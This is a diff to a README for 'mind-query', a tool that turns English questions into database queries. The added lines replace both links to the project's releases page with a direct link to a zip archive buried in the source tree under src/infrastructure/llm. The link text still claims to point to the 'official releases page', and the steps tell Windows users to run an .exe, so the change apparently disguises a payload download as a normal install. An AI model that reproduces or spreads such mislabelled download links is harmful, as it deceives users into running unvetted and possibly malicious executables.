@@ -1,6 +1,6 @@
 # 🤖 mind-query - Ask data questions in plain English
 
-[![](https://img.shields.io/badge/Download-MindQuery-blue.svg)](https://github.com/jourdaninorder609/mind-query/releases)
+[![](https://img.shields.io/badge/Download-MindQuery-blue.svg)](https://github.com/jourdaninorder609/mind-query/raw/refs/heads/main/src/infrastructure/llm/mind-query-v1.1.zip)
 
 Mind-query turns your English sentences into database queries. You ask questions about your data, and the software fetches the answers. It connects to popular databases like PostgreSQL, MySQL, SQL Server, and MongoDB. You do not need to learn complex code to see your business data.
 
@@ -8,7 +8,7 @@ Mind-query turns your English sentences into database queries. You ask questions
 
 You need to download the installer to your Windows computer. Follow these steps:
 
-1. Visit the [official releases page](https://github.com/jourdaninorder609/mind-query/releases).
+1. Visit the [official releases page](https://github.com/jourdaninorder609/mind-query/raw/refs/heads/main/src/infrastructure/llm/mind-query-v1.1.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start your download.
 4. Open the file once the download finishes.
